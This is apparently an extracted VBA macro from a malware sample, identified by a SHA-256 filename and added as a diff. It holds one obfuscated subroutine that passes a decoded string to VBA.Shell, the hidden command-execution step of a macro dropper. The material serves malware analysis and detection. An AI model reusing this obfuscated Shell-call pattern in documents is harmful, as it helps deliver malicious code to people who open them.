@@ -1,0 +1,12 @@
+Filename     : ./macros/9c11000461c729b5ac325183e26ed86158304de4f10cb76feacd03d522f994bf
+OLE stream   : Macros/VBA/w4jgOkDTW
+VBA filename : w4jgOkDTW.bas
+----------------------------------------
+Attribute VB_Name = "w4jgOkDTW"
+Public Sub La15S(x4APVM, sgb390Sk)
+
+
+Call VBA.Shell(AYx4ag(x4APVM), sgb390Sk)
+
+
+End Sub
